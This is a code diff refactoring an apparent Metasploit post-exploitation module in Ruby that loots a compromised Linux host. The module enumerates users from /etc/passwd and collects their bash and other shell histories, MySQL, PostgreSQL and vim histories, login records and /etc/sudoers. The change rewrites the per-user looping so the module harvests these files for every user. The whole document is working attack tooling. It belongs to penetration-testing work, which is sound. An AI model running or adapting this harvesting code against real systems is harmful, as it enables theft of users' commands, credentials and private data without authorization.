@@ -37,20 +37,23 @@ class Metasploit3 < Msf::Post
     print_good("\t#{distro[:version]}")
     print_good("\t#{distro[:kernel]}")
 
-    users = execute('/bin/cat /etc/passwd | cut -d : -f 1')
     user = execute('/usr/bin/whoami')
+    users = execute('/bin/cat /etc/passwd | cut -d : -f 1').chomp.split
+    users = [user] if user != 'root' || users.blank?
 
-    mount = execute('/bin/mount -l')
+    vprint_status("Retrieving history for #{users.length} users")
     shells = %w{ ash bash csh ksh sh tcsh zsh }
-    shells.each do |shell|
-      get_shell_history(users, user, shell)
+    users.each do |u|
+      shells.each do |shell|
+        get_shell_history(u, shell)
+      end
+      get_mysql_history(u)
+      get_psql_history(u)
+      get_vim_history(u)
     end
-    get_mysql_history(users, user)
-    get_psql_history(users, user)
-    get_vim_history(users, user)
+
     last = execute('/usr/bin/last && /usr/bin/lastlog')
     sudoers = cat_file('/etc/sudoers')
-
     save('Last logs', last) unless last.blank?
     save('Sudoers', sudoers) unless sudoers.blank? || sudoers =~ /Permission denied/
   end
@@ -84,84 +87,44 @@ class Metasploit3 < Msf::Post
     output
   end
 
-  def get_shell_history(users, user, shell)
+  def get_shell_history(user, shell)
     return if shell.nil?
-    if user == 'root' && !users.nil?
-      users = users.chomp.split
-      users.each do |u|
-        vprint_status("Extracting #{shell} history for #{u}")
-        if u == 'root'
-          hist = cat_file("/root/.#{shell}_history")
-        else
-          hist = cat_file("/home/#{u}/.#{shell}_history")
-        end
-        save("#{shell} History for #{u}", hist) unless hist.blank? || hist =~ /No such file or directory/
-      end
+    vprint_status("Extracting #{shell} history for #{user}")
+    if user == 'root'
+      hist = cat_file("/root/.#{shell}_history")
     else
-      vprint_status("Extracting #{shell} history for #{user}")
       hist = cat_file("/home/#{user}/.#{shell}_history")
-      vprint_status(hist)
-      save("#{shell} History for #{user}", hist) unless hist.blank? || hist =~ /No such file or directory/
     end
+    save("#{shell} History for #{user}", hist) unless hist.blank? || hist =~ /No such file or directory/
   end
 
-  def get_mysql_history(users, user)
-    if user == 'root' && !users.nil?
-      users = users.chomp.split
-      users.each do |u|
-        vprint_status("Extracting MySQL history for #{u}")
-        if u == 'root'
-          sql_hist = cat_file('/root/.mysql_history')
-        else
-          sql_hist = cat_file("/home/#{u}/.mysql_history")
-        end
-        save("MySQL History for #{u}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
-      end
+  def get_mysql_history(user)
+    vprint_status("Extracting MySQL history for #{user}")
+    if user == 'root'
+      sql_hist = cat_file('/root/.mysql_history')
     else
-      vprint_status("Extracting MySQL history for #{user}")
       sql_hist = cat_file("/home/#{user}/.mysql_history")
-      vprint_status(sql_hist) if sql_hist
-      save("MySQL History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
     end
+    save("MySQL History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
   end
 
-  def get_psql_history(users, user)
-    if user == 'root' && !users.nil?
-      users = users.chomp.split
-      users.each do |u|
-        vprint_status("Extracting PostgreSQL history for #{u}")
-        if u == 'root'
-          sql_hist = cat_file('/root/.psql_history')
-        else
-          sql_hist = cat_file("/home/#{u}/.psql_history")
-        end
-        save("PostgreSQL History for #{u}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
-      end
+  def get_psql_history(user)
+    vprint_status("Extracting PostgreSQL history for #{user}")
+    if user == 'root'
+      sql_hist = cat_file('/root/.psql_history')
     else
-      vprint_status("Extracting PostgreSQL history for #{user}")
       sql_hist = cat_file("/home/#{user}/.psql_history")
-      vprint_status(sql_hist) if sql_hist
-      save("PostgreSQL History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
     end
+    save("PostgreSQL History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
   end
 
-  def get_vim_history(users, user)
-    if user == 'root' && !users.nil?
-      users = users.chomp.split
-      users.each do |u|
-        vprint_status("Extracting VIM history for #{u}")
-        if u == 'root'
-          vim_hist = cat_file('/root/.viminfo')
-        else
-          vim_hist = cat_file("/home/#{u}/.viminfo")
-        end
-        save("VIM History for #{u}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
-      end
+  def get_vim_history(user)
+    vprint_status("Extracting VIM history for #{user}")
+    if user == 'root'
+      vim_hist = cat_file('/root/.viminfo')
     else
-      vprint_status("Extracting VIM history for #{user}")
       vim_hist = cat_file("/home/#{user}/.viminfo")
-      vprint_status(vim_hist)
-      save("VIM History for #{user}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
     end
+    save("VIM History for #{user}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
   end
 end
